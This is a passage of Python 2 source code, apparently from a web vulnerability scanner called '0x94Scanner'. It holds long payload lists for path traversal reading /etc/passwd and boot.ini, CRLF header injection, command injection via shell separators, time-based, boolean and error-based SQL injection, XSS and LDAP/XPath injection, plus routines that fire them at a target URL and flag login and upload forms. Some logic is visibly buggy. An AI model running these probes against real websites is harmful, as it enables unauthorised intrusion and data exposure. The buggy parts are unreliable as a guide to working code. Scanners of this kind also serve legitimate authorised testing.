                 '../../../../../../../etc/passwd',
                   '../../../../../../../../etc/passwd',
            '../../../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../../../../../etc/passwd',

            'index.php',
            '../index.php',
            '../../index.php',
            '../../../index.php',
            '../../../../index.php',
            '../../../../../index.php',
            '../../../../../../index.php',
            '../../../../../../../index.php',
            '../../../../../../../../index.php',
            '../../../../../../../../../index.php',
            '../../../../../../../../../../index.php',

            '../etc/passwd%00',
            '../../etc/passwd%00',
            '../../../etc/passwd%00',
            '../../../../etc/passwd%00',
            '../../../../../etc/passwd%00',
            '../../../../../../etc/passwd%00',
            '../../../../../../../etc/passwd%00',
            '../../../../../../../../etc/passwd%00',
            '../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../../../../../etc/passwd%00',

            'boot.ini%00',
            '../boot.ini%00',
            '../../boot.ini%00',
            '../../../boot.ini%00',
            '../../../../boot.ini%00',
            '../../../../../boot.ini%00',
            '../../../../../../boot.ini%00',
            '../../../../../../../boot.ini%00',
            '../../../../../../../../boot.ini%00',
            '../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../../../../../../boot.ini%00',
            '../../../../../../../../../../../../../../../../../boot.ini%00',


            'boot.ini',
            '../boot.ini',
            '../../boot.ini',
            '../../../boot.ini',
            '../../../../boot.ini',
            '../../../../../boot.ini',
            '../../../../../../boot.ini',
            '../../../../../../../boot.ini',
            '../../../../../../../../boot.ini',
            '../../../../../../../../../boot.ini',
            '../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../../../../../../boot.ini',
            '../../../../../../../../../../../../../../../../../../../boot.ini',
            "..%2fboot.ini%00",
            "..2f..%2fboot.ini%00",
            "..2f..%2f..%2fboot.ini%00",
            "..2f..%2f..%2f..%2fboot.ini%00",
            "..2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",

            "..%2fetc%2fpasswd%00",
            "..2f..%2fetc%2fpasswd%00",
            "..2f..%2f..%2fetc%2fpasswd%00",
            "..2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",

            "data:;base64,MHg5NDExMTEx",
            "data://text/plain;base64,MHg5NDExMTEx=",

            "data:;base64,MHg5NFNjYW5uZXIxMTEx"]



        for lfidizin in lfiyollar:
            try:
                for key,value in parse_qs(urlparse.urlparse(lfibul).query, True).items():
                    lfilihal={}
                    lfilihal[key]=lfidizin
                    lfiparametre = urllib.urlencode(lfilihal)
                    urlac = urllib2.urlopen(lfibul+"?"+lfiparametre)
                    response = self.temizle(urlac.read())
                    if "root:" in response or \
                                           "0x94Scanner1111" in response or \
                                           "noexecute=optout" in response or \
                       "<? " in response and "?>" or \
                       "<?php " in response and "?>" or \
                   "HTTP_HOST" in response or \
               "0x9411111" in response:
                        self.ekle("GET",lfibul,"Local File Include Etc",lfibul+lfidizin, response)

                    elif "OC_INIT_COMPONENT" in response or \
                                             "C:\WINDOWS\system32\Setup\iis.dll" in response:
                        self.ekle("GET",lfibul,"Local File Include Etc",lfibul+lfidizin, response)


                    lfilihal.clear()

            except urllib2.HTTPError,  e:
                if "root:" in e.read() or \
                                   "noexecute=optout" in e.read() or \
                                   "HTTP_HOST" in e.read() or \
                   "0x9411111" in e.read():
                    self.ekle("GET",lfibul,"Local File Include Etc",lfibul+lfidizin, e.read())

                elif "OC_INIT_COMPONENT" in e.read() or \
                                     "C:\WINDOWS\system32\Setup\iis.dll" in e.read():
                    self.ekle("GET",lfibul,"Local File Include Etc",lfibul+lfidizin, e.read())


                if(e.code==302):
                    self.hatakontrol("GET",lfibul,e.read(),lfibul+" LOCAL FILE INCLUDE")
    

                lfilihal.clear()
                if(e.code==500):
                    self.hatakontrol("GET",lfibul,e.read(),lfibul)
                 

            except urllib2.URLError,  e:
                lfilihal.clear()
            except:
                mesaj="Error"

    def lfitest(self,lfiurl):

        try:
            urlnormal=lfiurl.replace("=", "=0x94buradaydi.txt")
            urlac = urllib2.urlopen(urlnormal)
            response = self.temizle(urlac.read())
            
            if "failed to open stream" in response or "java.io.FileNotFoundException" in response:
                
                self.ekle("GET",lfiurl,"Local File Include",urlnormal, response)
                
                
            elif "Microsoft VBScript runtime error" in response and "File not found" in response:
                
                self.ekle("GET",lfiurl,"Local File Include",urlnormal, response)
                            



        except urllib2.HTTPError,  e:
            if(e.code==302):
                self.hatakontrol("GET",lfiurl,e.read(),urlnormal+" LOCAL FILE INCLUDE")
                
            if(e.code==500):
                self.hatakontrol("GET",lfiurl,e.read(),urlnormal)
                               
        except urllib2.URLError,  e:
            mesaj="Error"
        except:
            mesaj="Error"

    


    def headercrlf(self,link):

        injectionkod=["%0d%0a%20ScannerXXX%3aScannerXXX",
                              "%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a%3Chtml%3E%3Cfont color=red%3E0x94scanner%3C/font%3E%3C/html%3E",
                              "%0d%0aLocation:%20http://www.google.com",
                      "%0d%0aScannerXXX%3aScannerXXX%3dScannerXXX~3",
                      "%0D%0aLocation: javascript:%0D%0A%0D%0A<script>alert(0x000123)</script>"]

        for inj in injectionkod:    
            try:
                hinfo="";
                if "https://" in link:
                    conn = httplib.HTTPSConnection(urlparse.urlparse(link).hostname)
                else:
                    conn = httplib.HTTPConnection(urlparse.urlparse(link).hostname)

                getlink=link.replace(urlparse.urlparse(link).hostname,"")
                getlink2=getlink.replace("http://","").replace("https://","")

                conn.putrequest("GET", getlink2+inj)

                conn.putheader('UserAgent','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)+'+inj)
                conn.putheader('Referer',link+inj)
                conn.putheader('Cookie',sayfacookie[0]+inj)
                conn.putheader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'+inj)
                conn.putheader('Accept-Language','en-us,en;q=0.5'+inj)
                conn.putheader('Accept-Encoding', 'gzip, deflate'+inj)
                conn.putheader('Accept-Charset','ISO-8859-1,utf-8;q=0.7,*;q=0.7'+inj)
                conn.putheader('Connection','keep-alive'+inj)
                conn.putheader('0x94Scannerheader',"0x94Scannerheader")

                conn.endheaders()

                r1 = conn.getresponse()
                crlfresponsek=r1.read()

                for x,y in r1.getheaders():
                    hinfo+=x+y
                    if "0x94Scannerheader" in x or \
                                           "ScannerXXX" in x or \
                                           "ScannerXXX:ScannerXXX" in y and\
                       "0a" not in y:
                        self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)
                        
                    if "google.com" in y and \
                                           "0a" not in y:
                        self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)



                if "0x000123" in crlfresponsek:
                    self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)


                if "Warning: Header may not contain" in crlfresponsek or \
                                   "header, new line detected" in crlfresponsek:
                    self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)



                if "<title>Google</title>" in crlfresponsek:
                    self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)


                elif "0x94scanner" in crlfresponsek and \
                                     "Content-Type:" not in crlfresponsek:
                    self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)

            except:
                mesaj="Error" 


    
    def getcommandinj(self,url):

        seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
        cmdhal={}
        command=["SET /A 0xFFF123-2","expr 12345671 - 2"]

        for sep in seperators:
            for safcmd in command:
                try:
                    for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
                        cmdhal={}
                        cmdhal[key]=sep+safcmd
                    cmdparametre = urllib.urlencode(cmdhal)
                    urlac = urllib2.urlopen(url+"?"+cmdparametre)
                    response = urlac.read()
                    cmdhal.clear()

                    if "12345669" in response  or "16773409" in response:
                        self.ekle("GET",url,"Command Injection",cmdparametre, response)

                except urllib2.HTTPError,  e:
                    if "12345669" in e.read()  or "16773409" in e.read():
                        self.ekle("GET",url,"Command Injection",cmdparametre, e.read())

                    if(e.code==302):
                        self.hatakontrol("GET",url,e.read(),url+" GET Command injection")
                        

                    cmdhal.clear()
                    if(e.code==500):
                        self.hatakontrol("GET",url,e.read(),url)		    
       
                except urllib2.URLError,  e:
                    mesaj="Error "
                        #yaz(mesaj)
                except:
                    mesaj="Error"
                            #yaz(mesaj)


    def openredirect(self,gelenurl):

        redirect=["http://www.google.com",
                          "www.google.com",
                          "google.com",
                  "%2f%2fwww.google.com%3f",
                  "https://www.google.com",
                 "//google.com",
                "//https://www.google.com",
                "5;URL='https://www.google.com'"]

        for rlinkler in redirect:
            try:
                urlnormal=gelenurl.replace("=", "="+rlinkler+"?")
                urlac = urllib2.urlopen(urlnormal)
                response = urlac.read()
                if "<title>Google</title>" in response:
                    self.ekle("GET",gelenurl,"Open Redirect",urlnormal, response)

            except urllib2.HTTPError,  e:
                if(e.code==302):
                    if "<title>Google</title>" in e.read():
                        self.ekle("GET",gelenurl,"Open Redirect",urlnormal, e.read())
                if(e.code==500):
                    ma,na=self.hatakontrol("GET",urlnormal,e.read(),url)	
                    if ma:
                        self.ekle("GET",gelenurl,"Open Redirect",urlnormal, e.read())

            except urllib2.URLError,  e:
                mesaj="Error"
            except:
                mesaj="Error"                                        


    def sql(self,urlnormal):

        sqlt = ["'", "\"", "\xBF'\"(", "(", ")"]
        for sqlpay in sqlt:
            try:
                urlnormal=urlnormal.replace("=", "="+sqlpay)
                urlac = urllib2.urlopen(urlnormal)
                response = self.temizle(urlac.read())
                self.hatakontrol("GET",urlnormal,response,urlnormal)
                

            except urllib2.HTTPError,  e:
                if(e.code==302):
                    self.hatakontrol("GET",urlnormal,e.read(),urlnormal+" GET SQL INECTION"+sqlpay)
                                
                if(e.code==500):
                    self.hatakontrol("GET",urlnormal,e.read(),urlnormal) 
                                      

            except urllib2.URLError,  e:
                mesaj="Error"
            except:
                mesaj="Error"


    def timebasedvalue(self,url):
        
        protocol=urlparse.urlparse(url).scheme+"://"
        timesql=[" WAITFOR DELAY '0:0:25';--",
                         "') OR SLEEP(25)"
                         "1') AND SLEEP(25) AND ('LoUL'='LoUL",
                 "' WAITFOR DELAY '0:0:25' and 'a'='a;--",
                 "' and  sleep(25) and  'a'='a",
                "' WAITFOR DELAY '0:0:25';--",
               " IF 1=1 THEN dbms_lock.sleep(25);",
               " ' IF 1=1 THEN dbms_lock.sleep(25);",
                 "' waitfor delay '0:0:25';--",
                 " ' WAITFOR DELAY '0:0:25';--",
                 "; SLEEP(25)",
                 " SLEEP(25)",
                 "' SLEEP(25)--",
                 "' SLEEP(25)",
                 " pg_sleep(25)",
                 " ' pg_sleep(25)",
                 " PG_DELAY(25)",
                 " ' PG_DELAY(25)",
                 " and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
                 " ' and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
                 " DBMS_LOCK.SLEEP(25);",
                 " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--",
                 "1,'0');waitfor delay '0:0:25;--",
                 "');waitfor delay'0:0:25';--",
                 ");waitfor delay '0:0:25';--",
                 "' and pg_sleep(25)--",
                 "1) and pg_sleep(25)--",
                 "\") and pg_sleep(25)--",
                 "') and pg_sleep(25)--",
                 "1)) and pg_sleep(25)--",
                 ")) and pg_sleep(25)--",
                 "')) and pg_sleep(25)--",
                 "\")) or pg_sleep(25)--",
                 "')) or pg_sleep(25)--",
                 "1) and sleep(25)--",
                 "\") and sleep(25)--",
                 "') and sleep(25)--",
                 "1)) and sleep(25)--",
                 ")) and sleep(25)--",
                 "')) and sleep(25)--",
                 "\")) or sleep(25)--",
                 "' or pg_sleep(25)--",
                 "')) or sleep(25)--",
                 "(SELECT 1 FROM (SELECT SLEEP(25))A)",
                 "'%2b(select*from(select(sleep(25)))a)%2b'",
                 "/**/xor/**/sleep(25)"
                 "1' or (sleep(49)+1) limit 1 -- "]
        

        for timeler in timesql:
            try:
                yenitime={}
                
                for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
                    
                    yenitime[key]=value[0]+timeler

                host=urlparse.urlparse(url).netloc
                dosya=urlparse.urlparse(url).path
                encoded_args = urllib.urlencode(yenitime)
                responsex = urllib2.urlopen(protocol+host+dosya+"?"+encoded_args,timeout=20)
                responsey = self.temizle(responsex.read())
                self.hatakontrol("GET",url,responsey,"xxx")
                      

            except urllib2.HTTPError,  e:
                if(e.code==302):
                    self.hatakontrol("GET",url,e.read(),url+" TIME BASED")
                    

                if(e.code>=500 or e.code<=505):
                    self.hatakontrol("GET",url,e.read(),url)
                    self.ekle("GET",url,"Timebased SQL Injection /HTTP 500",url+timeler, e.read())

            except socket.timeout:
                self.ekle("GET",url,"Timebased SQL Injection",url+timeler, "Timeout")
            

            except urllib2.URLError,  e:
                if "Time" in e.reason:
                    self.ekle("GET",url,"Timebased SQL Injection",url+timeler, e.read())

            except:
                mesaj="Error"



    def comparePages(self,page1,page2,deurl,info):



        tmp1 = re.split("<[^>]+>",page1)
        tmp2 = re.split("<[^>]+>",page2)
        count1 = 0;
        count2 = 0;



        for i in range(len(tmp1)):
            if page2.find(tmp1[i]) < 0:
                if "action=" not in tmp1[i]:
                    mesaj="Link %s  \n" % (deurl)
                    mesaj+=info+"\n"
                    count1+=1



        for i in range(len(tmp2)):
            if page1.find(tmp2[i]) < 0:
                count2+=1
                ##print max(count1, count2)
        return max(count1, count2)    



    def request(self,URL):
        user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }
        req = urllib2.Request(URL, None, user_agent)
        try:
            request = urllib2.urlopen(req)

        except HTTPError, e:
            mesaj="hata"

        return len(request.read())

    def vuln_check(self,URL):
        global TrueResponse
        TrueResponse = int(self.request(URL + '%20AND%2043%20like%2043--+'))
        FalseResponse = int(self.request(URL + '%20AND%2034%20like%2043--+'))

        if(TrueResponse != FalseResponse):
            return 'boolean'
        else:
            start = time.time()
            SleepResponse = request(URL + '%20and%20sleep(5)--+')
            elapsed_time = (time.time() - start)

            if(elapsed_time > 5):
                return 'time'

    def temizle(self,source):

        yenisource=source.replace("<script","")
        yenisource1=re.sub(r"\"(.*?)\"|'(.*?)'","",yenisource)
        return yenisource1        

    def blind(self,urlblind):

        html1=""
        html2=""
        try:
            
            linknormal = urllib2.urlopen(urlblind)
            normalkaynak=self.temizle(linknormal.read())
        except urllib2.HTTPError,e:
            if(e.code==302):
                self.hatakontrol("GET",urlblind,linknormal.read(),urlblind+" BLIND SQL")
      
    
            if(e.code==500):
                self.hatakontrol("GET",urlblind,linknormal.read(),urlblind)
    
        except urllib2.URLError,e:
            mesaj="Err"
        aa="err"
        bitiskarakter=[""]
        true_strings = ["'or''='","' or 1=1--","0x94' AND 'a'='a","' OR 'bk'='bk","' and 1=(select 1)+'","' aNd 1=1"," and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1"," group by 1","'+(SELECT 1)+'","' and 1=(select 1)+'","'+aNd+10>1","' OR 9-8=1","' and '1'='1",'" OR "1"="1']
        false_strings =["'or''!!!='","' or 1=2--","0x94' AND 'a'='b","' OR 'bk'='0x94","' and 1=(select 999999)+'","' aNd 1=2"," and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2"," group by 99999","'+(SELECT 99999)+'","' and 1=(select 2)+'","'+aNd+10>20","' OR 9-8=2","' and '1'='2",'" OR "1"="2']
        for sonkarakter in bitiskarakter:
            i=0
            while i < len(true_strings)-1:

                blindtrue = urlblind + urllib.urlencode(parse_qs(true_strings[i]+sonkarakter))
                try:
                    req1 = urllib2.Request(blindtrue.replace("&",urllib.urlencode(parse_qs(true_strings[i])) +"&").replace(" ", "%20"))
                    req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
                    req1.add_header('Keep-Alive: ','115')
                    req1.add_header('Referer: ','http://'+urlblind)
                    response1 = urllib2.urlopen(req1)
                    response_headers = response1.info()

                    html1 = self.temizle(response1.read())

                except urllib2.HTTPError,e:
                    if(e.code==302):
                        self.hatakontrol("GET",urlblind,e.read(),urlblind+" BLIND SQL")
              

                    if(e.code==500):
                        self.hatakontrol("GET",urlblind,e.read(),urlblind)
           
                except urllib2.URLError,e:
                    mesaj="Err"

                except:
                    mesaj="errr"
                blindfalse = urlblind + urllib.urlencode(parse_qs(false_strings[i]+sonkarakter))
                try:
                    i=i+1
                    req2 = urllib2.Request(blindfalse.replace("&",urllib.urlencode(parse_qs(false_strings[i]+sonkarakter)) +"&").replace(" ", "%20"))
                    req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
                    req2.add_header('Keep-Alive: ','115')
                    req2.add_header('Referer: ','http://'+urlblind)
                    response2 = urllib2.urlopen(req2)
                    html2 = self.temizle(response2.read())

                except urllib2.HTTPError,e:
                    if(e.code==302):
                        self.hatakontrol("GET",urlblind,e.read(),urlblind+" BLIND SQL")
       
                    if(e.code==500):
                        self.hatakontrol("GET",urlblind,e.read(),urlblind)
       
                except urllib2.URLError,e:
                    mesaj="asad"
                    #yaz(mesaj)

                except:
                    mesaj="entry"    
                if normalkaynak==html1:
                    if html1!=html2:
                        if len(html1)!=len(html2):
                            xx=self.vuln_check(urlblind)
                            if "boolean" or "time":
                                self.ekle("GET",url,"Timebased SQL Injection",urlblind, response2)
                            


    def xsscalisiomu(self,kaynak):

        xssdurum=False

        bakalim=set(list(kaynak.split("\n")))

        for satir in bakalim:
            if "\"><0x000123>" in satir:
                if "<code>" in satir or "<noscript>" in satir:
                    xssdurum=True
                else:
                    xssdurum=False

        return xssdurum 

    def xsstara(self,xssurl):

        xsspayload=["\"><script>alert(0x000123)</script>",
                            "\"><sCriPt>alert(0x000123)</sCriPt>",
                            "\"; alert(0x000123)",
                    "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
                    "\"><img Src=0x94 onerror=alert(0x000123)>",
                   "\"><BODY ONLOAD=alert(0x000123)>",
                  "'%2Balert(0x000123)%2B'",
                  "\"><0x000123>",
                    "'+alert(0x000123)+'",
            "%2Balert(0x000123)%2B'",
            "'\"--></style></script><script>alert(0x000123)</script>",
            "'</style></script><script>alert(0x000123)</script>",
            "</script><script>alert(0x000123)</script>",
            "</style></script><script>alert(0x000123)</script>",
            "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
            "'\"--></style></script><script>alert(0x000123)</script>",
            "';alert(0x000123)'",
            "<scr<script>ipt>alert(0x000123)</script>",
            "<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
            "'){}}alert(0x000123);",
            "');alert(0x000123)//"]

        for xssler in xsspayload:
            try:

                urlnormal=xssurl.replace("=", "="+xssler)
                urlac = urllib2.urlopen(urlnormal)
                response = urlac.read()
                if "<script>alert(0x000123)" in response or \
                                   "');alert(0x000123)" in response or \
                                   "<sCriPt>alert(0x000123)" in response or \
                   "+alert(0x000123)+" in response or \
                   "'%2Balert(0x000123)%2B'" in response or \
                "<BODY ONLOAD=alert(0x000123)>" in response or \
             "<img Src=0x94 onerror=alert(0x000123)" in response:
                    xssmi=self.xsscalisiomu(response)
                    if xssmi==False:
                        if "failed to open stream" not in e.read():                                                
                            self.ekle("GET",xssurl,"XSS",urlnormal, response)
                    else:
                        if "failed to open stream" not in e.read():                                                
                            self.ekle("GET",xssurl,"XSS",urlnormal, response)

            except urllib2.HTTPError,  e:
                if "<script>alert(0x000123)" in e.read() or \
                                   "');alert(0x000123)" in e.read() or \
                                   "<sCriPt>alert(0x000123)" in e.read() or \
                   "+alert(0x000123)+" in e.read() or \
                   "'%2Balert(0x000123)%2B'" in e.read() or \
                "<BODY ONLOAD=alert(0x000123)>" in e.read() or \
             "<img Src=0x94 onerror=alert(0x000123)" in e.read():
                    xssmi=self.xsscalisiomu(e.read())
                    if xssmi==False:
                        if "failed to open stream" not in e.read():
                            self.ekle("GET",xssurl,"XSS",urlnormal, e.read())
                    else:
                        if "failed to open stream" not in e.read():                        
                            self.ekle("GET",xssurl,"XSS",urlnormal, e.read())

                if(e.code==500):
                    self.hatakontrol("GET",xssurl,e.read(),urlnormal)
              

            except urllib2.URLError,  e:
                mesaj="eraff"
            except:
                mesaj="asad"  
                

    def xsstest(self,xsstesturl):

        try:
            urlac = urllib2.urlopen(xsstesturl+"0x000123")
            response = urlac.read()
            if "0x000123" in response:
                self.xsstara(xsstesturl)

            else:
                self.xsstara(xsstesturl)
 

        except urllib2.HTTPError,e:
            if "0x000123" in e.read():
                self.xsstara(xsstesturl)


            else:
                self.xsstara(xsstesturl)
    

            if(e.code==500):
                self.hatakontrol("GET",url,e.read(),xsstesturl)	    
   
        except urllib2.URLError,  e:
            mesaj="adad"
        except:
            mesaj="xadaf"


    def getldapvexpath(self,url):

        injpayload = [")","^($!@$)(()))******","<!--'\"a"]


        for lxpath in injpayload:

            try:

                urlnormal=url+urllib.urlencode(parse_qs(lxpath))
                urlac = urllib2.urlopen(urlnormal.replace("&",urllib.urlencode(parse_qs(lxpath)) +"&").replace(" ", "%20"))
                response = urlac.read()
                ma,na=self.hatakontrol("GET",url,response,urlnormal.replace("&",urllib.urlencode(parse_qs(lxpath)) +"&").replace(" ", "%20"))
                if ma:
                    return True,url+lxpath,response
            except urllib2.HTTPError,  e:
                if(e.code==302):
                    self.hatakontrol("GET",url,e.read(),urlnormal+" INECTION"+lxpath)
                                    
                if(e.code==500):
                    self.hatakontrol("GET",url,e.read(),urlnormal)
                                

            except urllib2.URLError,  e:
                mesaj="fafag"
                #yaz(mesaj)
            except:
                mesaj="mamama"
                #yaz(mesaj)     



        return False,"",""   



    def formyaz(self,url):
    
        global postlarisuz
    
        try:
            protocol=urlparse.urlparse(url).scheme+"://"
            toplamveri={}
        
            html = urllib2.urlopen(url).read()
            soup = BeautifulSoup(html)
    
            forms=soup.findAll("form")
            for form in forms:
                if form.has_key('action'):
                    if form['action'].find(protocol) == -1:
    
                        if url.count("/")>=3:
                            if url.count("/")==3:
                                dizin=protocol+url.rsplit("/")[2]+"/"
                            elif url.count("/")==4:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"
                            elif url.count("/")==5:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"
    
                            elif url.count("/")==6:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"
    
                            elif url.count("/")==7:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"
    
                            elif url.count("/")==8:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"
    
                            elif url.count("/")==9:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"+url.rsplit("/")[8]+"/"
    
                            elif url.count("/")==10:
                                dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"+url.rsplit("/")[6]+"/"+url.rsplit("/")[7]+"/"+url.rsplit("/")[8]+"/"+url.rsplit("/")[9]+"/"
    
    
    
                            formurl=dizin + "/" + form['action'].strip('/')
                            #print formurl
                    else:
                        formurl=url
                        #print "action: " + formurl
                else:
                    formurl=url
                    #print "action: " + formurl
                if form.has_key('method') and form['method'].lower() == 'post':
                    formurl=url
                    #•yaz(" [#] [POST] Yeri action url : "+formurl,True)
                    #print "[POST] action " +url
                    for post_inputselect in form.findAll("select"):
                        #print post_inputselect['name']
                        toplamveri[post_inputselect['name']]=""
    
                    for post_input in form.findAll("input"):
                        if post_input.has_key('type'):
                            if post_input['type'].lower() == 'file':
                                a="[#] Upload "+formurl
                                self.ekle("POST",formurl,"UPLOAD", "UPLOAD FORM","")
                                
                            if post_input['type'].lower() == 'text' or post_input['type'].lower() == 'password' or   post_input['type'].lower() == 'hidden' or post_input['type'].lower() == 'radio':
                                if post_input.has_key('id'):
                                    #print post_input['id']
                                    if "user" in post_input['id'] or \
                               "username" in post_input['id'] or \
                       "password" in post_input['id'] or \
                       "pass" in post_input['id']:
                                        self.ekle("POST",formurl,"LOGIN", "LOGIN FORM FOUND","")
                                    
                                        a="[#] Login Sayfasi tespit Edildi "+formurl
                                    if post_input.has_key('value'):
                                        toplamveri[post_input['id']]=post_input['value']
                                    else:
                                        toplamveri[post_input['id']]=""
                                elif post_input.has_key('name'):
                                    if "user" in post_input['name'] or \
                               "username" in post_input['name'] or \
                       "password" in post_input['name'] or \
                       "pass" in post_input['name']:
